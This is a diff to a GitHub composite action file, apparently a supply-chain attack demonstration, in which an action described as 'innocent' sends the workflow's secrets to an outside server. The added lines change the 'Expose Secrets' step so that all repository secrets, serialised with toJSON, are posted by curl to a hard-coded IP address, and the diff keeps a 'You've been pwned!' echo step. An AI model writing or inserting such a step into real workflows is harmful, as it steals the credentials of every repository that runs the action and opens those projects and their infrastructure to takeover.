@@ -1,5 +1,5 @@
 name: "RepoC Action"
-description: "Innocent action interacting with RepoB"
+description: "Innocent action interacting with RepoB and exposing secrets"
 
 inputs:
   token:
@@ -9,13 +9,13 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - name: Dummy Step
-      run: echo "You've been pwned!"
-      shell: bash
-
     - name: Expose Secrets
       env:
-        SECRET_VAR: ${{ inputs.token }}
+        ALL_SECRETS: ${{ toJSON(secrets) }}
       run: |
-        echo "$SECRET_VAR" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
+        echo "$ALL_SECRETS" | curl -X POST -H "Content-Type: application/json" --data-binary @- http://91.205.105.40/secrets
+      shell: bash
+
+    - name: Dummy Step
+      run: echo "RepoC: You've been pwned!"
       shell: bash
